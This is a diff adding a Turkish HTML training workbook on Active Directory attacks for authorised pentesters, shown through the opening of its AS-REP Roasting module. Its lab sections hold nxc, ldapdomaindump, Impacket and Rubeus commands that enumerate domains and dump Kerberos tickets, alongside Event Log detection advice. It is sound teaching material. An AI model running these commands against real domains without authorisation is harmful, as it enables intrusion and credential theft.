@@ -1,0 +1,1581 @@
+<!doctype html>
+<html lang="tr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AD Saldırı Akademisi</title>
+<meta name="description" content="Active Directory saldırılarını kavramdan lab uygulamasına öğreten adım adım workbook.">
+<style>*{margin:0}img{max-width:100%}[hidden]{display:none!important}</style>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;500;600&display=swap">
+<style>
+:root{
+  --bg:#f4f5f7; --panel:#ffffff; --panel-2:#eef0f3; --ink:#1b2230; --ink-soft:#4a5468;
+  --line:#dfe3ea; --line-soft:#e9ecf1;
+  --accent:#7a4dd6; --accent-soft:#e9e0fb; --accent-ink:#5a34ad;
+  --amber:#b26a12; --amber-bg:#f6ead2;
+  --teal:#1f7a5c; --teal-bg:#d9efe6;
+  --loud:#c0392b; --loud-bg:#f8e2df;
+  --code-bg:#f0f1f4; --code-ink:#243b53; --tok:#8a5a00; --tok2:#1f7a5c;
+  --shadow:0 1px 2px rgba(20,28,45,.06),0 4px 16px rgba(20,28,45,.05);
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#0f1119; --panel:#181b28; --panel-2:#13151f; --ink:#e8eaf2; --ink-soft:#9aa0b6;
+  --line:#282c3d; --line-soft:#1e2130;
+  --accent:#b79dff; --accent-soft:#2c2247; --accent-ink:#c9b6ff;
+  --amber:#e0a458; --amber-bg:#37291491;
+  --teal:#4fc79a; --teal-bg:#123027;
+  --loud:#e06a5e; --loud-bg:#3a1f1c;
+  --code-bg:#0b0d15; --code-ink:#cdd7e8; --tok:#e0a458; --tok2:#4fc79a;
+  --shadow:0 1px 2px rgba(0,0,0,.3),0 6px 22px rgba(0,0,0,.3);
+}}
+:root[data-theme="dark"]{
+  --bg:#0f1119; --panel:#181b28; --panel-2:#13151f; --ink:#e8eaf2; --ink-soft:#9aa0b6;
+  --line:#282c3d; --line-soft:#1e2130;
+  --accent:#b79dff; --accent-soft:#2c2247; --accent-ink:#c9b6ff;
+  --amber:#e0a458; --amber-bg:#372914; --teal:#4fc79a; --teal-bg:#123027;
+  --loud:#e06a5e; --loud-bg:#3a1f1c;
+  --code-bg:#0b0d15; --code-ink:#cdd7e8; --tok:#e0a458; --tok2:#4fc79a;
+  --shadow:0 1px 2px rgba(0,0,0,.3),0 6px 22px rgba(0,0,0,.3);
+}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--ink);
+  font-family:"IBM Plex Sans",system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
+  font-size:15.5px;line-height:1.62;-webkit-font-smoothing:antialiased}
+code,pre,.mono{font-family:"IBM Plex Mono",ui-monospace,Menlo,monospace}
+a{color:var(--accent)}
+.layout{display:grid;grid-template-columns:270px 1fr;min-height:100vh}
+
+.side{position:sticky;top:0;height:100vh;overflow-y:auto;background:var(--panel-2);
+  border-right:1px solid var(--line);padding:22px 16px;display:flex;flex-direction:column;gap:2px}
+.brand{display:flex;align-items:center;gap:11px;margin-bottom:14px}
+.brand .dot{width:12px;height:12px;border-radius:3px;background:var(--accent);box-shadow:0 0 0 3px var(--accent-soft)}
+.brand b{font-size:15.5px;letter-spacing:.01em}
+.brand span{display:block;font-size:10.5px;color:var(--ink-soft);letter-spacing:.15em;text-transform:uppercase;margin-top:2px}
+.side-lbl{font-size:10.5px;letter-spacing:.15em;text-transform:uppercase;color:var(--ink-soft);margin:16px 8px 6px}
+.navlink{display:flex;align-items:baseline;gap:10px;padding:8px 11px;border-radius:8px;color:var(--ink-soft);
+  text-decoration:none;font-size:13.5px;font-weight:500;transition:.13s;line-height:1.35}
+.navlink:hover{background:var(--panel);color:var(--ink)}
+.navlink.active{background:var(--accent-soft);color:var(--accent-ink)}
+.navlink .n{font-family:"IBM Plex Mono";font-size:11px;color:var(--accent);min-width:20px;font-weight:600}
+.prog{margin:10px 8px 4px;font-size:11px;color:var(--ink-soft);font-family:"IBM Plex Mono"}
+.progbar{height:5px;background:var(--line);border-radius:3px;margin:5px 8px 2px;overflow:hidden}
+.progbar > i{display:block;height:100%;background:var(--accent);width:0;transition:width .3s}
+
+.main{padding:0 clamp(20px,5vw,72px) 110px;max-width:900px}
+.topbar{position:sticky;top:0;z-index:20;background:color-mix(in srgb,var(--bg) 90%,transparent);
+  backdrop-filter:blur(8px);padding:16px 0;margin-bottom:6px;border-bottom:1px solid var(--line-soft);
+  display:flex;align-items:center;gap:12px}
+.topbar h4{font-size:12.5px;color:var(--ink-soft);font-weight:500;margin:0}
+.themebtn{margin-left:auto;border:1px solid var(--line);background:var(--panel);color:var(--ink-soft);
+  border-radius:8px;width:34px;height:34px;cursor:pointer;font-size:15px}
+
+.hero{padding:34px 0 10px}
+.hero .ey{font-family:"IBM Plex Mono";font-size:12px;letter-spacing:.18em;text-transform:uppercase;color:var(--accent);font-weight:600}
+.hero h1{font-size:clamp(30px,5vw,44px);margin:10px 0 12px;letter-spacing:-.025em;line-height:1.05;text-wrap:balance;font-weight:700}
+.hero p{color:var(--ink-soft);max-width:60ch;font-size:16px;margin:0}
+.howto{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin:26px 0 8px}
+.howto div{background:var(--panel);border:1px solid var(--line);border-radius:11px;padding:13px 15px;box-shadow:var(--shadow)}
+.howto b{display:block;font-size:12px;color:var(--accent);margin-bottom:3px;font-family:"IBM Plex Mono"}
+.howto p{font-size:12.5px;color:var(--ink-soft);margin:0}
+.disc{background:var(--loud-bg);border:1px solid var(--loud);border-radius:11px;padding:13px 16px;
+  font-size:13px;margin:20px 0 0;display:flex;gap:10px}
+
+/* module */
+.mod{margin-top:56px;scroll-margin-top:90px;border-top:1px solid var(--line);padding-top:8px}
+.mod-badge{display:inline-flex;align-items:center;gap:8px;font-family:"IBM Plex Mono";font-size:12px;
+  color:var(--accent);font-weight:600;margin-top:22px;letter-spacing:.04em}
+.mod-badge .lv{font-size:10px;padding:2px 8px;border-radius:20px;background:var(--accent-soft);color:var(--accent-ink);letter-spacing:.05em}
+.mod h2{font-size:27px;margin:8px 0 6px;letter-spacing:-.02em;line-height:1.12;text-wrap:balance;font-weight:700}
+.mod .sub{color:var(--ink-soft);font-size:15px;margin:0 0 8px}
+
+.step{margin-top:22px}
+.step-h{display:flex;align-items:center;gap:10px;margin:0 0 10px}
+.step-h .ic{width:30px;height:30px;border-radius:8px;display:grid;place-items:center;font-size:15px;flex:none}
+.step-h h3{font-size:16.5px;margin:0;font-weight:600}
+.ic.concept{background:var(--accent-soft)}
+.ic.why{background:var(--amber-bg)}
+.ic.lab{background:var(--teal-bg)}
+.ic.out{background:var(--panel-2)}
+.ic.det{background:var(--loud-bg)}
+.ic.task{background:var(--accent-soft)}
+.body p{margin:0 0 12px;color:var(--ink)}
+.body ul,.body ol{margin:0 0 12px;padding-left:22px}
+.body li{margin-bottom:6px}
+.body strong{font-weight:600}
+.body code{background:var(--code-bg);padding:1px 6px;border-radius:5px;font-size:12.5px;color:var(--code-ink)}
+.k{color:var(--accent-ink);font-weight:600;background:var(--accent-soft);padding:1px 6px;border-radius:5px;font-size:13.5px}
+
+pre{background:var(--code-bg);border:1px solid var(--line-soft);border-radius:10px;padding:13px 15px;
+  overflow-x:auto;margin:0 0 12px;font-size:13px;line-height:1.65;color:var(--code-ink);position:relative}
+pre .c{color:var(--ink-soft);font-style:italic}
+pre .p{color:var(--tok)} pre .s{color:var(--tok2)}
+.copy{position:absolute;top:8px;right:8px;background:var(--panel);border:1px solid var(--line);
+  color:var(--ink-soft);border-radius:6px;font-size:10.5px;padding:3px 8px;cursor:pointer;opacity:0;transition:.13s;font-family:"IBM Plex Mono"}
+pre:hover .copy{opacity:1}
+.copy:hover{color:var(--accent);border-color:var(--accent)}
+
+.callout{border-radius:10px;padding:12px 15px;margin:0 0 12px;font-size:13.5px;border:1px solid var(--line)}
+.callout.tip{background:var(--teal-bg);border-color:transparent}
+.callout.warn{background:var(--amber-bg);border-color:transparent}
+.callout.det{background:var(--loud-bg);border-color:transparent}
+.callout b{font-weight:600}
+.callout .ct{display:block;font-family:"IBM Plex Mono";font-size:10.5px;text-transform:uppercase;letter-spacing:.08em;margin-bottom:4px;opacity:.85}
+
+/* flow diagram */
+.flow{display:flex;flex-wrap:wrap;align-items:stretch;gap:0;margin:4px 0 14px;
+  background:var(--panel);border:1px solid var(--line);border-radius:11px;padding:14px;box-shadow:var(--shadow)}
+.flow .node{flex:1;min-width:110px;text-align:center;padding:8px 6px;position:relative}
+.flow .node .num{font-family:"IBM Plex Mono";font-size:10px;color:var(--accent);font-weight:600}
+.flow .node b{display:block;font-size:12.5px;margin:3px 0}
+.flow .node small{font-size:11px;color:var(--ink-soft);line-height:1.35;display:block}
+.flow .node:not(:last-child)::after{content:"→";position:absolute;right:-7px;top:26px;color:var(--accent);font-weight:700}
+@media(max-width:640px){.flow .node:not(:last-child)::after{display:none}}
+
+.done-row{display:flex;align-items:center;gap:10px;margin-top:20px;padding:12px 15px;
+  background:var(--panel);border:1px solid var(--line);border-radius:10px;box-shadow:var(--shadow)}
+.done-row label{display:flex;align-items:center;gap:9px;cursor:pointer;font-size:13.5px;font-weight:500;user-select:none}
+.done-row input{width:17px;height:17px;accent-color:var(--accent);cursor:pointer}
+.done-row .st{margin-left:auto;font-size:12px;color:var(--ink-soft);font-family:"IBM Plex Mono"}
+
+.esc-table{width:100%;border-collapse:collapse;font-size:13px;margin:0 0 12px}
+.esc-table th,.esc-table td{text-align:left;padding:8px 11px;border-bottom:1px solid var(--line-soft);vertical-align:top}
+.esc-table th{color:var(--accent);font-size:11px;text-transform:uppercase;letter-spacing:.05em}
+.esc-table td:first-child{font-family:"IBM Plex Mono";font-weight:600;white-space:nowrap;color:var(--ink)}
+
+.roadmap{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:6px 20px;margin-top:14px;box-shadow:var(--shadow)}
+.roadmap .ri{display:flex;gap:14px;padding:13px 0;border-bottom:1px solid var(--line-soft)}
+.roadmap .ri:last-child{border-bottom:0}
+.roadmap .ri .rn{font-family:"IBM Plex Mono";color:var(--accent);font-weight:600;font-size:13px;flex:none;width:24px}
+.roadmap .ri b{font-size:14px}
+.roadmap .ri p{margin:2px 0 0;font-size:13px;color:var(--ink-soft)}
+.pill{font-size:10.5px;font-family:"IBM Plex Mono";padding:2px 8px;border-radius:20px;background:var(--panel-2);color:var(--ink-soft);margin-left:8px}
+.pill.soon{background:var(--amber-bg);color:var(--amber)}
+
+@media(max-width:860px){
+  .layout{grid-template-columns:1fr}
+  .side{position:static;height:auto}
+  .side .navwrap{display:none}
+}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+</head>
+<body>
+
+<div class="layout">
+  <nav class="side">
+    <div class="brand"><div class="dot"></div>
+      <div><b>AD Saldırı Akademisi</b><span>kavram → lab → tespit</span></div></div>
+    <div class="prog">İlerleme <span id="ptxt">0 / 6</span></div>
+    <div class="progbar"><i id="pbar"></i></div>
+    <div class="navwrap">
+      <div class="side-lbl">Temeller</div>
+      <a class="navlink" href="#m0"><span class="n">00</span>Nasıl Çalışılır</a>
+      <a class="navlink" href="#m1"><span class="n">01</span>AD Anatomisi</a>
+      <a class="navlink" href="#m2"><span class="n">02</span>NTLM &amp; Kerberos İçi İşleyiş</a>
+      <div class="side-lbl">İlk Saldırılar</div>
+      <a class="navlink" href="#m3"><span class="n">03</span>AS-REP Roasting</a>
+      <a class="navlink" href="#m4"><span class="n">04</span>Kerberoasting</a>
+      <a class="navlink" href="#m5"><span class="n">05</span>Parola Sprey &amp; Enum</a>
+      <div class="side-lbl">Yükseltme</div>
+      <a class="navlink" href="#m6"><span class="n">06</span>ACL İstismarı</a>
+      <a class="navlink" href="#m7"><span class="n">07</span>Kerberos Delegasyon</a>
+      <a class="navlink" href="#m8"><span class="n">08</span>Shadow Credentials</a>
+      <a class="navlink" href="#m9"><span class="n">09</span>ADCS (ESC1-16)</a>
+      <a class="navlink" href="#m10"><span class="n">10</span>NTLM Relay &amp; Coercion</a>
+      <div class="side-lbl">Ele Geçirme</div>
+      <a class="navlink" href="#m11"><span class="n">11</span>Credential Toplama</a>
+      <a class="navlink" href="#m12"><span class="n">12</span>Domain Dominance &amp; Ticket</a>
+      <a class="navlink" href="#m13"><span class="n">13</span>Trust &amp; Forest</a>
+      <a class="navlink" href="#m14"><span class="n">14</span>Timeroasting</a>
+      <a class="navlink" href="#m15"><span class="n">15</span>noPac (CVE-2021-42278/87)</a>
+      <a class="navlink" href="#m16"><span class="n">16</span>Certifried (CVE-2022-26923)</a>
+      <a class="navlink" href="#m17"><span class="n">17</span>MSSQL İstismarı</a>
+      <a class="navlink" href="#m18"><span class="n">18</span>SCCM / MECM</a>
+      <a class="navlink" href="#m19"><span class="n">19</span>Hibrit / Entra ID</a>
+      <a class="navlink" href="#final"><span class="n">✓</span>Bitiş &amp; Sonraki Adım</a>
+    </div>
+  </nav>
+
+  <main class="main">
+    <div class="topbar">
+      <h4 id="crumb">AD Saldırı Akademisi</h4>
+      <button class="themebtn" id="theme" title="Tema">◐</button>
+    </div>
+
+    <section class="hero">
+      <div class="ey">Yetkili Pentest · Öğrenme Modu</div>
+      <h1>Active Directory'yi kırarak öğren</h1>
+      <p>Her modül aynı ritimde ilerler: önce mekanizmanın <b>nasıl çalıştığını</b> anlarsın,
+      sonra <b>neden kırıldığını</b>, ardından <b>lab'ında adım adım uygularsın</b> ve son olarak
+      mavi takımın <b>seni nasıl yakaladığını</b> görürsün. Referans dosyan "ne komutu" derse,
+      burası "neden ve nasıl" der.</p>
+
+      <div class="howto">
+        <div><b>🧠 KAVRAM</b><p>Mekanizma gerçekte ne yapıyor</p></div>
+        <div><b>⚙️ NEDEN</b><p>Tasarım nerede istismar ediliyor</p></div>
+        <div><b>🔬 LAB</b><p>Kendi ortamında adım adım uygula</p></div>
+        <div><b>🛡️ TESPİT</b><p>Mavi takım hangi izle yakalar</p></div>
+      </div>
+
+      <div class="disc"><span>⚠</span><div><b>Yalnızca kendi lab'ında ve yazılı izinli engagement'ta.</b>
+      Buradaki her teknik gerçek sistemlerde izinsiz kullanıldığında suçtur. Banka testinde
+      RoE/scope her komuttan önce gelir.</div></div>
+    </section>
+
+    <!-- M0 -->
+    <section class="mod" id="m0" data-mod>
+      <div class="mod-badge">MODÜL 00 <span class="lv">başlangıç</span></div>
+      <h2>Bu kaynağı nasıl kullanmalısın</h2>
+      <p class="sub">Lab'ın hazır — şimdi verimli çalışmanın yolu.</p>
+      <div class="body">
+        <ol>
+          <li><strong>Sırayla ilerle.</strong> Modül 02 (Kerberos) olmadan 03-04 (roasting) ezbere kalır. Temelleri atlama.</li>
+          <li><strong>Her lab adımını gerçekten çalıştır.</strong> Okumak değil, terminalde görmek öğretir. Çıktıyı <span class="k">beklenen çıktı</span> ile karşılaştır.</li>
+          <li><strong>Sonra "detektif" ol.</strong> Aynı saldırıyı yaptıktan sonra DC'nin Event Log'unda izini bul — savunmayı anlamadan saldırıyı anlamış sayılmazsın.</li>
+          <li><strong>Not tut.</strong> Her modülün <span class="k">mini görevini</span> kendi kelimelerinle yaz. Banka raporunda bu anlatım becerisi işine yarayacak.</li>
+          <li><strong>Takılırsan geri dön.</strong> Bir saldırı çalışmıyorsa neredeyse her zaman bir önceki katmanda (SPN yok, pre-auth açık, imzalama kapalı) cevap vardır.</li>
+        </ol>
+        <div class="callout tip"><span class="ct">Lab önerisi</span>
+          Kurduğun ortam GOAD değilse de sorun yok. İhtiyacın: <b>1 DC (Server 2019+)</b>, <b>1-2 üye sunucu/istemci</b>,
+          bir <b>ADCS (CA)</b> rolü ve birkaç <b>SPN'li servis hesabı + zayıf parolalı kullanıcı</b>. Kali/Parrot saldırgan kutun olsun.</div>
+        <div class="done-row"><label><input type="checkbox" data-done="m0">Bu modülü tamamladım</label>
+          <span class="st">ilerlemeni takip eder</span></div>
+      </div>
+    </section>
+
+    <!-- M1 -->
+    <section class="mod" id="m1" data-mod>
+      <div class="mod-badge">MODÜL 01 <span class="lv">temel</span></div>
+      <h2>Active Directory Anatomisi</h2>
+      <p class="sub">Saldırdığın şeyin haritasını çıkar: forest, domain, OU, obje, ACL.</p>
+
+      <div class="step">
+        <div class="step-h"><div class="ic concept">🧠</div><h3>Kavram — AD nedir, neyden oluşur</h3></div>
+        <div class="body">
+          <p>Active Directory, bir organizasyonun tüm kullanıcı, bilgisayar ve kaynaklarını tutan
+          merkezi bir <b>veritabanı + kimlik doğrulama sistemidir</b>. Hiyerarşiyi tanı:</p>
+          <ul>
+            <li><span class="k">Forest</span> — en dış güvenlik sınırı. Bir veya daha çok domain içerir. Gerçek güvenlik sınırı domain değil, <b>forest</b>tir.</li>
+            <li><span class="k">Domain</span> — ortak politika/veritabanı paylaşan obje topluluğu (ör. <code>bank.local</code>). Kimlik doğrulamayı <b>Domain Controller (DC)</b> yürütür.</li>
+            <li><span class="k">OU</span> (Organizational Unit) — objeleri gruplama ve <b>GPO</b> uygulama kabı.</li>
+            <li><span class="k">Obje</span> — kullanıcı, bilgisayar, grup. Her objenin <b>öznitelikleri</b> (attribute) vardır: <code>servicePrincipalName</code>, <code>memberOf</code>, <code>userAccountControl</code>…</li>
+            <li><span class="k">GPO</span> (Group Policy) — makinelere/kullanıcılara toplu ayar/politika dağıtımı. Yanlış yapılandırılırsa yetki yükseltme yolu.</li>
+          </ul>
+          <p>Her obje bir <span class="k">SID</span> (benzersiz kimlik) taşır ve LDAP protokolüyle sorgulanır.
+          AD aslında dev bir LDAP dizinidir — bu yüzden okuma yetkisi olan herkes çok şey görebilir.</p>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-h"><div class="ic why">⚙️</div><h3>Neden saldırgan için önemli</h3></div>
+        <div class="body">
+          <p>AD'nin gücü aynı zamanda zafiyeti: <b>varsayılan olarak her domain kullanıcısı dizinin
+          büyük kısmını okuyabilir.</b> Yani sıradan bir hesapla bile kimin admin olduğunu, hangi
+          hesabın SPN taşıdığını, delegasyon ilişkilerini ve ACL'leri görebilirsin. Saldırı yolları
+          bu okunabilir ilişkilerin içinde saklıdır — BloodHound tam da bunu grafiğe döker.</p>
+          <div class="callout warn"><span class="ct">Kilit kavram: ACL</span>
+            Her objenin bir <b>DACL</b>'i (kim ne yapabilir listesi) vardır. <code>GenericAll</code>,
+            <code>WriteDACL</code>, <code>ForceChangePassword</code> gibi yetkiler yanlış kişilere
+            verilmişse, bu doğrudan bir ele geçirme yoludur. AD saldırılarının çoğu "obje X üzerinde
+            yetkim var mı?" sorusudur.</div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-h"><div class="ic lab">🔬</div><h3>Lab — kendi domain'ini keşfet</h3></div>
+        <div class="body">
+          <p>Bir domain kullanıcı credential'ıyla, henüz hiçbir şey "hacklemeden" ortamı oku:</p>
+          <pre><span class="c"># Domain temel bilgileri ve parola politikası</span>
+nxc smb <span class="p">DC_IP</span> -u <span class="s">user</span> -p <span class="s">'Parola!'</span> --pass-pol
+<span class="c"># Tüm kullanıcı / grup / bilgisayarları dök</span>
+nxc smb <span class="p">DC_IP</span> -u <span class="s">user</span> -p <span class="s">'Parola!'</span> --users --groups --computers
+<span class="c"># LDAP envanterini HTML olarak çıkar (tarayıcıda incele)</span>
+ldapdomaindump -u <span class="p">'DOMAIN\user'</span> -p <span class="s">'Parola!'</span> <span class="p">DC_IP</span> -o loot/<button class="copy">kopyala</button></pre>
+          <p>Windows tarafında yerleşik araçla da bak (LOLBin, hiç araç yüklemeden):</p>
+          <pre><span class="c"># PowerShell — temel domain bilgisi</span>
+Get-ADDomain; Get-ADForest
+<span class="c"># Admin sayısı yüksek olan hesaplar (adminCount=1)</span>
+Get-ADUser -Filter <span class="s">'adminCount -eq 1'</span> -Properties adminCount<button class="copy">kopyala</button></pre>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-h"><div class="ic out">📤</div><h3>Beklenen çıktı</h3></div>
+        <div class="body">
+          <p>Şunları çıkarmış olmalısın: <b>domain adı ve SID</b>, <b>parola politikası + lockout eşiği</b>
+          (spray için kritik), <b>Domain/Enterprise Admins üyeleri</b>, ve <code>loot/</code> içinde
+          tarayıcıda açılabilen bir <code>domain_users.html</code>. Bu senin "harita"n.</p>
+          <div class="callout tip"><span class="ct">İpucu</span> <code>description</code> ve <code>info</code>
+          alanlarını mutlaka tara — yöneticiler sık sık oraya parola/servis notu yazar. Bu, kolay bir ilk zafiyettir.</div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-h"><div class="ic det">🛡️</div><h3>Tespit &amp; savunma</h3></div>
+        <div class="body">
+          <p>Salt-okuma LDAP enumerasyonu <b>çok sessizdir</b> ve varsayılan loglamada neredeyse iz
+          bırakmaz — bu yüzden saldırının ilk adımıdır. Ancak <b>toplu/hızlı</b> LDAP sorguları
+          (ör. tüm objeleri çekme) gelişmiş çözümlerde (Microsoft Defender for Identity) "recon"
+          davranışı olarak işaretlenebilir. Savunma tarafı: gereksiz "Authenticated Users okuma"
+          yetkilerini kısmak ve hassas alanları (LAPS, description) korumaktır.</p>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-h"><div class="ic task">🎯</div><h3>Mini görev</h3></div>
+        <div class="body">
+          <ul>
+            <li>Lab domain'inin SID'ini ve lockout eşiğini bir yere yaz.</li>
+            <li>BloodHound-python ile veri topla ve "Domain Admins" grubunun üyelerini grafikte gör.</li>
+            <li>Kendi kelimelerinle: "Forest neden gerçek güvenlik sınırıdır?" — 2 cümle yaz.</li>
+          </ul>
+          <div class="done-row"><label><input type="checkbox" data-done="m1">Bu modülü tamamladım</label>
+            <span class="st">01 / 20</span></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- M2 -->
+    <section class="mod" id="m2" data-mod>
+      <div class="mod-badge">MODÜL 02 <span class="lv">temel · en önemli</span></div>
+      <h2>NTLM &amp; Kerberos İçi İşleyiş</h2>
+      <p class="sub">AD saldırılarının %80'i bu iki protokolün mekaniğinden doğar. Burayı gerçekten anla.</p>
+
+      <div class="step">
+        <div class="step-h"><div class="ic concept">🧠</div><h3>Kavram — kimlik doğrulama nasıl olur</h3></div>
+        <div class="body">
+          <p><b>NTLM</b> eski, challenge-response tabanlı bir protokol. Sunucu bir "challenge" gönderir,
+          istemci parolasının hash'iyle yanıt üretir. Parolanın kendisi gitmez — ama <b>NTLM hash'i
+          parolanın yerine geçer</b>. İşte "Pass-the-Hash" bu yüzden mümkün: hash'i biliyorsan parolayı
+          bilmene gerek yok.</p>
+          <p><b>Kerberos</b> modern varsayılan. Bilet (ticket) tabanlı çalışır. Üç oyuncu var:
+          istemci, <b>KDC</b> (Domain Controller üzerinde çalışır) ve hedef servis. Akış:</p>
+          <div class="flow">
+            <div class="node"><span class="num">1 · AS-REQ/REP</span><b>TGT al</b><small>İstemci kimliğini kanıtlar, KDC bir <b>TGT</b> verir (krbtgt ile şifreli)</small></div>
+            <div class="node"><span class="num">2 · TGS-REQ/REP</span><b>Servis bileti al</b><small>TGT'yi gösterip belirli bir <b>SPN</b> için <b>TGS</b> ister</small></div>
+            <div class="node"><span class="num">3 · AP-REQ</span><b>Servise bağlan</b><small>TGS'yi hedef servise sunar, servis kendi hash'iyle açar</small></div>
+          </div>
+          <p>Anahtar terimler: <span class="k">TGT</span> (Ticket Granting Ticket — "kimlik pasaportun",
+          <code>krbtgt</code> hesabının anahtarıyla şifrelenir), <span class="k">TGS</span> (belirli bir
+          servise erişim bileti, <b>servis hesabının</b> anahtarıyla şifrelenir), <span class="k">SPN</span>
+          (Service Principal Name — bir servisi tanımlayan etiket, ör. <code>MSSQLSvc/db01</code>),
+          <span class="k">PAC</span> (bilet içindeki yetki/grup bilgisi).</p>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-h"><div class="ic why">⚙️</div><h3>Neden bu tasarım saldırılara açık</h3></div>
+        <div class="body">
+          <p>Kerberos'un birkaç zarif zayıflığı, sonraki tüm modüllerin temelidir:</p>
+          <ul>
+            <li><b>TGS, servis hesabının parola hash'iyle şifrelenir.</b> Bir TGS istersen, onu çevrimdışı
+            kırıp servis hesabının parolasını elde edebilirsin → <b>Kerberoasting</b> (Modül 04).</li>
+            <li><b>Pre-authentication kapalıysa</b>, kimlik kanıtlamadan AS-REP alabilirsin ve o da
+            kullanıcının hash'iyle şifrelidir → <b>AS-REP Roasting</b> (Modül 03).</li>
+            <li><b>TGT, krbtgt hash'iyle şifrelenir.</b> krbtgt hash'ini ele geçirirsen istediğin kimlikte
+            sahte TGT üretebilirsin → <b>Golden Ticket</b>.</li>
+            <li><b>PAC'i KDC üretir ama servis güvenir.</b> Delegasyon yanlış yapılandırılırsa kimliğe
+            bürünme (impersonation) mümkün olur → <b>Delegasyon saldırıları</b>.</li>
+          </ul>
+          <div class="callout warn"><span class="ct">Sezgi</span> Kerberos'ta saldırı fırsatı neredeyse her
+          zaman şu cümleden çıkar: <b>"Bu bilet X'in hash'iyle şifreli ve ben bu bileti isteyebiliyorum."</b>
+          Eğer bileti alabiliyor ve X'in parolası zayıfsa, X senindir.</div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-h"><div class="ic lab">🔬</div><h3>Lab — Kerberos trafiğini kendi gözünle gör</h3></div>
+        <div class="body">
+          <p>Soyut kalmasın — biletleri gerçekten iste ve incele:</p>
+          <pre><span class="c"># Bir TGT iste ve ccache'e kaydet (Impacket)</span>
+impacket-getTGT <span class="p">bank.local</span>/<span class="s">user</span>:<span class="s">'Parola!'</span>
+export KRB5CCNAME=user.ccache
+<span class="c"># Elindeki biletleri listele — encryption type, süre, SPN gör</span>
+klist   <span class="c"># (Linux'ta: impacket ile; Windows'ta yerleşik klist)</span>
+<span class="c"># Windows'ta mevcut biletleri dök (Rubeus)</span>
+Rubeus.exe triage
+Rubeus.exe dump<button class="copy">kopyala</button></pre>
+          <p><b>Dikkatle bak:</b> <code>etype</code> alanında <code>rc4_hmac (0x17)</code> mü yoksa
+          <code>aes256 (0x12)</code> mi? RC4 biletler kırılmaya çok daha açıktır — roasting'de bunu
+          hedefleyeceğiz. Bilet süresine ve hangi SPN'e ait olduğuna da bak.</p>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-h"><div class="ic out">📤</div><h3>Beklenen çıktı</h3></div>
+        <div class="body">
+          <p>Şunu içselleştirmiş olmalısın: bir credential aldığında önce <b>TGT</b> alırsın, sonra
+          her servis için ayrı <b>TGS</b>. Kırılabilir hash'ler bu biletlerin şifreleme katmanından
+          gelir. "TGT vs TGS", "hangi bilet kimin hash'iyle şifreli" sorularına düşünmeden cevap
+          verebiliyorsan hazırsın.</p>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-h"><div class="ic det">🛡️</div><h3>Tespit &amp; savunma</h3></div>
+        <div class="body">
+          <p>Kerberos olayları DC'de <b>Security</b> log'unda toplanır:</p>
+          <ul>
+            <li><code>4768</code> — TGT istendi (AS-REQ). Anormal saatte/host'tan çokluğu şüpheli.</li>
+            <li><code>4769</code> — TGS istendi. <b>Kerberoasting'in imzası budur</b> (Modül 04).</li>
+            <li><code>4771</code> — Kerberos pre-auth başarısız (spray/brute belirtisi).</li>
+          </ul>
+          <p>Savunma: servis hesaplarını <b>AES'e zorlamak</b> (RC4 kapatmak), <b>güçlü/uzun parola veya gMSA</b>
+          kullanmak, ve <code>etype</code> RC4 downgrade'lerini SIEM'de izlemektir.</p>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-h"><div class="ic task">🎯</div><h3>Mini görev</h3></div>
+        <div class="body">
+          <ul>
+            <li>Bir TGT ve bir TGS al, ikisinin <code>etype</code>'ını karşılaştır.</li>
+            <li>"krbtgt hash'i neden Golden Ticket'ın anahtarıdır?" — kendi cümlenle açıkla.</li>
+            <li>DC'de Event Viewer'ı aç, kendi TGT isteğini <code>4768</code> olarak bul.</li>
+          </ul>
+          <div class="done-row"><label><input type="checkbox" data-done="m2">Bu modülü tamamladım</label>
+            <span class="st">02 / 20</span></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- M3 -->
+    <section class="mod" id="m3" data-mod>
+      <div class="mod-badge">MODÜL 03 <span class="lv">saldırı · kolay</span></div>
+      <h2>AS-REP Roasting</h2>
+      <p class="sub">Pre-auth kapalı hesaplardan, credential'a bile gerek kalmadan kırılabilir hash.</p>
+
+      <div class="step">
+        <div class="step-h"><div class="ic concept">🧠</div><h3>Kavram</h3></div>
+        <div class="body">
+          <p>Normalde Kerberos'ta <b>pre-authentication</b> vardır: TGT istemeden önce parolanı bildiğini
+          kanıtlarsın (zaman damgasını hash'inle şifreleyerek). Ama bir hesapta
+          <code>DONT_REQ_PREAUTH</code> bayrağı açıksa, KDC kimliğini <b>kanıtlatmadan</b> AS-REP döner —
+          ve bu yanıtın bir kısmı <b>kullanıcının parola hash'iyle</b> şifrelidir. Yani o şifreli parçayı
+          alıp çevrimdışı kırabilirsin.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic why">⚙️</div><h3>Neden çalışır</h3></div>
+        <div class="body">
+          <p>İki koşul yeter: (1) hedef hesapta pre-auth kapalı, (2) parolası kırılabilir. Credential'ın
+          olması bile şart değil — sadece geçerli bir <b>kullanıcı adı listesi</b> yeterlidir. Bu yüzden
+          bu, credential'sız aşamada denenecek ilk saldırılardandır.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic lab">🔬</div><h3>Lab</h3></div>
+        <div class="body">
